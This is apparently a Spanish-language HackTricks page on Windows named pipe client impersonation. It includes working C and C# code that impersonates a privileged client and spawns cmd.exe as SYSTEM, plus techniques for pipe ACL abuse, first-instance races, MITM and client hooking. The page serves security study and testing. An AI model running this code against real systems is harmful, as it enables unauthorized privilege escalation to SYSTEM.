# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation es una primitiva de escalada de privilegios local que permite a un thread de un named-pipe server adoptar el security context de un cliente que se conecta a él. En la práctica, un atacante que puede ejecutar código con SeImpersonatePrivilege puede forzar a un cliente privilegiado (por ejemplo, un servicio SYSTEM) a conectarse a un pipe controlado por el atacante, llamar a ImpersonateNamedPipeClient, duplicar el token resultante en un primary token y ejecutar un proceso como el cliente (a menudo NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Esta página se centra en la técnica principal. Para exploit chains end-to-end que fuerzan a SYSTEM a conectarse a tu pipe, consulta las páginas de la familia Potato referenciadas a continuación.

## TL;DR
- Crea un named pipe: \\.\pipe\<random> y espera una conexión.
- Haz que un componente privilegiado se conecte a él (spooler/DCOM/EFSRPC/etc.).
- Lee al menos un mensaje del pipe y, después, llama a ImpersonateNamedPipeClient.
- Abre el impersonation token del thread actual, ejecuta DuplicateTokenEx(TokenPrimary) y usa CreateProcessWithTokenW/CreateProcessAsUser para obtener un proceso SYSTEM.<sup>[[2]](#references)</sup>

## Requisitos y APIs principales
- Privilegios que normalmente necesita el proceso/thread que realiza la llamada:
- SeImpersonatePrivilege para suplantar correctamente a un cliente conectado y usar CreateProcessWithTokenW.
- Como alternativa, después de suplantar a SYSTEM, puedes usar CreateProcessAsUser, que puede requerir SeAssignPrimaryTokenPrivilege y SeIncreaseQuotaPrivilege (se cumplen cuando estás suplantando a SYSTEM).
- APIs principales utilizadas:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (debes leer al menos un mensaje antes de la suplantación)
- ImpersonateNamedPipeClient y RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW o CreateProcessAsUser
- Nivel de suplantación: para realizar acciones útiles localmente, el cliente debe permitir SecurityImpersonation (valor predeterminado para muchos clientes RPC/named-pipe locales). Los clientes pueden reducirlo usando SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION al abrir el pipe.<sup>[[3]](#references)</sup>

## Flujo de trabajo Win32 mínimo (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notas:
- Si ImpersonateNamedPipeClient devuelve ERROR_CANNOT_IMPERSONATE (1368), asegúrate de leer primero desde la pipe y de que el cliente no haya restringido la impersonation al nivel Identification.
- Prefiere DuplicateTokenEx con SecurityImpersonation y TokenPrimary para crear un token primario adecuado para la creación de procesos.

## Ejemplo rápido de .NET
En .NET, NamedPipeServerStream puede realizar la impersonation mediante RunAsClient. Una vez realizada la impersonation, duplica el token del thread y crea un proceso.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Triggers/coerciones comunes para obtener SYSTEM en tu pipe
Estas técnicas fuerzan a servicios privilegiados a conectarse a tu named pipe para que puedas impersonarlos:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Consulta aquí el uso detallado y la compatibilidad:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Si solo necesitas un ejemplo completo de cómo crear el pipe y hacer impersonation para iniciar SYSTEM desde un service trigger, consulta:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Cuando un servicio privilegiado y un proceso con pocos privilegios se comunican mediante `\\.\pipe\...`, trata el pipe como cualquier otra frontera IPC no confiable. Más allá de la impersonation clásica del lado del servidor, unas ACLs débiles del pipe, flags de creación inseguros y decisiones de confianza del lado del cliente también pueden convertirse en primitivas de escalada de privilegios local.<sup>[[7]](#references)</sup>

### Enumera primero los pipes candidatos
- Lista rápidamente los pipes desde PowerShell: `Get-ChildItem \\.\pipe\`
- `pipelist64.exe` de Sysinternals es útil para detectar el número de instancias y los pipes de instancia única.
- Da prioridad a los nombres usados por servicios que se ejecuten como `SYSTEM`, especialmente helpers, updaters, launchers y UI brokers.

### MITM mediante DACLs permisivas e instancias adicionales del pipe
- Cualquier proceso que pueda comunicarse con un servidor privilegiado ya puede hacer fuzzing de su protocolo y buscar verbs privilegiados.<sup>[[7]](#references)</sup>
- El caso más interesante se produce cuando la DACL concede `FILE_GENERIC_WRITE`/`GENERIC_WRITE` sobre el objeto pipe. En named pipes esto incluye implícitamente `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` comparte el mismo bit), por lo que un attacker puede crear otra instancia de servidor con el mismo nombre.
- Como las instancias se emparejan en orden FIFO, las instancias creadas por el attacker y las legítimas pueden intercalarse: crea una instancia rogue con `CreateNamedPipe`, abre después el mismo nombre del pipe con `CreateFile` y espera a que un cliente real se conecte a la instancia del servidor rogue.
- Resultado: observar, modificar, relay o desincronizar IPC privilegiado sin necesidad de tomar el control del proceso del servidor original.

### Race de la primera instancia en los security descriptors del pipe
- `lpSecurityAttributes` solo define la DACL cuando se crea la primera instancia de un nombre de pipe.<sup>[[4]](#references)[[7]](#references)</sup>
- Si un servicio privilegiado se inicia tarde y no usa `FILE_FLAG_FIRST_PIPE_INSTANCE`, un attacker puede precrear el nombre del pipe con una DACL permisiva y permitir que el servicio cree posteriormente otras instancias bajo el security context elegido por el attacker.
- Esto convierte el inicio del servicio en una race condition: gana la primera instancia y después conecta o hace MITM de los clientes posteriores usando la ACL debilitada.
- Mitigación para defenders y punto clave de revisión para attackers: comprueba si `CreateNamedPipe(..., dwOpenMode, ...)` incluye `FILE_FLAG_FIRST_PIPE_INSTANCE`. Si no lo incluye, prueba la precreación antes de que se inicie el servicio.

### Las comprobaciones de PID/firma son hardening, no una frontera
- Algunos productos intentan restringir el acceso comprobando `GetNamedPipeClientProcessId`, la ruta de la imagen del proceso o el firmante de Authenticode del cliente que se conecta.<sup>[[7]](#references)</sup>
- Esto solo ayuda hasta que inyectas código en el cliente legítimo: una vez dentro del proceso de confianza, heredas exactamente el contexto de PID/imagen/firma que espera el servidor.
- En split desktop apps, instrumentar el proceso UI/helper con pocos privilegios suele ser más fácil que atacar directamente el servicio `SYSTEM`.

### Hookea el cliente según su modelo de I/O
- I/O síncrono: intercepta `NtWriteFile` antes de que el syscall consuma el buffer e inspecciona/modifica `NtReadFile` después de que retorne.<sup>[[7]](#references)</sup>
- I/O overlapped: guarda el `OVERLAPPED`/`IoStatusBlock` observado en `NtReadFile` y después inspecciona el buffer cuando `GetOverlappedResult` o la espera correspondiente finalice.
- Completion ports: `GetQueuedCompletionStatus` llega hasta `NtRemoveIoCompletion`; el `ApcContext` devuelto enlaza con el `OVERLAPPED` usado por la lectura original, que es el punto adecuado para localizar el buffer ya rellenado.
- Completion routines (`ReadFileEx`): el callback de finalización se entrega como un APC. Si quieres manipular los datos devueltos o inyectar respuestas sintéticas, hookea la completion routine real y, para custom injection, usa un dispatcher de `QueueUserAPC` de un argumento que reconstruya los 3 argumentos esperados por la routine.<sup>[[5]](#references)[[7]](#references)</sup>

### Notas sobre tooling
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) hace proxy del tráfico de named pipes mediante una helper DLL inyectada y ofrece un workflow similar al de Burp para editar y reproducir tráfico.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) utiliza un enfoque basado en Frida y se centra en hookear `NtReadFile`/`NtWriteFile` junto con los pivots asíncronos/de finalización anteriores, para después reenviar el tráfico a un workflow de edición respaldado por WebSocket.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Consideraciones operativas
- Named pipes tienen baja latencia; las pausas prolongadas mientras se editan buffers pueden provocar un deadlock en servicios frágiles.<sup>[[7]](#references)</sup>
- Los clientes basados en Overlapped/completion-port/APC necesitan hooks diferentes a los detours simples de `ReadFile`/`WriteFile`.
- La Injection en el trusted client es ruidosa y, por lo general, es mejor reservarla para el desarrollo de exploits, el reversing de protocolos o el fuzzing en laboratorios locales.

## Solución de problemas y errores comunes
- Debes leer al menos un mensaje del pipe antes de llamar a ImpersonateNamedPipeClient; de lo contrario, obtendrás ERROR_CANNOT_IMPERSONATE (1368).<sup>[[1]](#references)</sup>
- Si el cliente se conecta con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, el servidor no puede realizar una impersonation completa; comprueba el nivel de impersonation del token mediante GetTokenInformation(TokenImpersonationLevel).<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW requiere SeImpersonatePrivilege en el caller. Si falla con ERROR_PRIVILEGE_NOT_HELD (1314), usa CreateProcessAsUser después de haber realizado la impersonation de SYSTEM.
- Asegúrate de que el security descriptor de tu pipe permita al servicio objetivo conectarse si lo endureces; de forma predeterminada, los pipes bajo \\.\pipe son accesibles según la DACL del servidor.<sup>[[3]](#references)</sup>

## Referencias

- [1] [Windows: documentación de ImpersonateNamedPipeClient](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: escalada de privilegios mediante Windows named pipes](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: seguridad y derechos de acceso de Named Pipe](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: función CreateNamedPipe](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: servidor de Named Pipe mediante Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap - una herramienta proxy de Named Pipe para Windows](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: hooking de Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
